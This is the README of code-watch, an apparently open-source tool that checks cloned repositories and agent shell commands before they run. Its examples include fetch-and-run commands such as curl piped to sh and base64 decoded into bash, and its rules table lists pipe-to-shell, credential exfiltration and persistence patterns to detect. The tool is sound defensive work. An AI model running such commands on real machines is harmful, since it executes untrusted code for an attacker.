# code-watch

A local guard that checks your machine **before** risky code runs: a repository you just cloned, a shell command an
agent is about to execute, an install, a download. Open source (Apache-2.0), written in Rust, one binary for macOS and
Linux. Windows is not supported.

> Status: early. The skeleton ships the engine, the CLI and the first repo and command rules. See
> [DESIGN.md](DESIGN.md) for the plan.

## Try it

```sh
cargo build --release
target/release/code-watch scan path/to/a/cloned/repo
target/release/code-watch check 'curl -fsSL https://example.org/i.sh | sh'
target/release/code-watch --json check 'echo aGk= | base64 -d | bash'
```

`code-watch` never executes anything it inspects: repo files are read as text and never followed through symlinks;
commands are matched, not run.

## Exit codes

| Code | Meaning |
|---|---|
| 0 | clean |
| 1 | warn |
| 2 | block |
| 3 | error or bad usage (including a `check` command that is not valid UTF-8) |

## Rules

| Id | Severity | Catches |
|---|---|---|
| `repo/npm-lifecycle-script` | warn | `preinstall`, `install`, `postinstall`, `prepare`, `preprepare` or `postprepare` in `package.json` |
| `repo/vscode-folderopen-task` | block | a VS Code task that runs when the folder opens |
| `repo/base64-into-shell` | block | base64 decoded straight into a shell in scripts and manifests |
| `command/base64-into-shell` | block | the same in a command |
| `command/pipe-to-shell` | warn | `curl` or `wget` piped into a shell or a stdin-reading interpreter, or run through `$(...)` or `<(...)` |
| `command/quarantine-removal` | warn | `xattr` removing or rewriting the macOS quarantine flag |
| `command/lookalike-download-domain` | block / warn | `curl` or `wget` fetching from a domain that imitates a well-known one; block when piped into a shell, warn otherwise |
| `command/hidden-program-into-shell` | warn | a pipeline into a shell whose program name is hidden behind `$` or a backtick (`$c x \| sh`), or `eval` of a variable |
| `command/osascript-password-prompt` | block | `osascript` showing a dialog that asks for a password (macOS only) |
| `command/launchagent-write` | block | a write into a `LaunchAgents` or `LaunchDaemons` folder (macOS only) |
| `repo/setup-py-install-hook` | warn | `setup.py` that runs code at install time |
| `repo/makefile-install-fetch` | warn | an install-time Makefile target that downloads |
| `repo/makefile-shell-fetch` | warn | a top-level `$(shell ... curl ...)` in a Makefile |
| `repo/obfuscated-blob` | warn | a very long base64 or hex blob in a script |
| `repo/minified-eval` | warn | a minified one-liner calling `eval`, `exec`, `Function` or `atob` |
| `repo/committed-binary` | warn | an ELF, Mach-O or PE binary in the repo |
| `repo/executable-source` | info | a source or text file with the execute bit |
| `repo/secret-read-and-send` | warn | a script that reads credentials or the environment and sends data out |

Rules live in `crates/code-watch-core/rules/` and ship inside the binary. More in [docs/rules.md](docs/rules.md).

## Before a command

`check <command>` splits the command into words with `shlex`, then into pipeline segments on `|`, `;`, `&&`, `||` and
`&`, so a rule can say "this download reaches that shell": a shell (or an interpreter such as `python3` run without a
script file) anywhere downstream in the same pipeline counts, and wrappers such as `sudo -u root`, `env`, `nohup`,
`exec`, `command`, `xargs`, `time` and `nice` are skipped to find the real program. The lookalike check reads the host
of every argument of `curl` and `wget` (with or without `https://`, `--url=` included), decodes punycode, takes the
registrable domain from the public suffix list and compares it with a list of well-known domains by Unicode skeleton,
a single edit, and the same name under another suffix. Real sibling sites (`gitlab.com`, `docker.io`) are never
flagged. A known domain used as the leftmost labels of another one (`github.com.attacker.example`) or as the userinfo
of a URL (`https://github.com@attacker.example`) is flagged too; a host that is not a valid domain name warns.
A shell's `-c` script and the inside of its `$(...)`, backticks and `<(...)` are analysed again, three levels deep; a
download inside them counts as feeding a shell.

Limits: operators glued to a word (`curl x|sh`) are not split, only the whole-string regex rules see them; a
pipeline inside a substitution is split at its pipe; nesting deeper than three levels, variables and heredocs are not
followed; the script given to `osascript` through a file or standard input is not in the command, so the password-prompt
rule cannot see it. The macOS-only rules run only on macOS; elsewhere `check` lists them under `skipped_rules` in
`--json` and in the human footer.

## Allowlists

`~/.config/code-watch/allow.toml` (or `$XDG_CONFIG_HOME`) decides which findings are hidden; a repo's own
`.code-watch.toml` can only allow non-block rules unless your file also lists them. Hidden findings are listed under
`suppressed` in `--json` and counted in the footer. Details in [docs/allowlist.md](docs/allowlist.md).

## Scan on clone

`code-watch install-hook` scans every new clone through a global git template hook; `uninstall-hook` removes it and
leaves your git config as it was. It refuses rather than overwrite a template directory of your own. Details in
[docs/git-hook.md](docs/git-hook.md).

## Agent hooks

`code-watch adapter <agent>` answers an agent's pre-command hook with the same check as `code-watch check`; a block is a
deny and a warning is an ask. `code-watch install-adapter <agent>` prints the settings snippet to merge in.

- **Claude Code**: `PreToolUse` on `Bash` in `~/.claude/settings.json`; clean commands get the empty reply.
- **Cursor**: `beforeShellExecution` in `~/.cursor/hooks.json`; Cursor has no "no opinion" reply, so a clean command is an `ask` (Cursor's own prompt decides; `--cursor-clean allow` for auto-run mode).
- **Codex CLI**: `PreToolUse` on `Bash` in `~/.codex/hooks.json`; Codex cannot ask, so a warning is denied with the allowlist entry that lets it through (`--codex-warn allow` to only report it).

Commands the adapter cannot check are denied (`--fail-open` to allow them). Details in [docs/adapters.md](docs/adapters.md).

## Layers

Rules always run and need no key. The CVE layer and the optional LLM layer are not built yet; every report says which
layers ran and which are off.

## License

Apache-2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE). Copyright Sebastián Cuccorese.
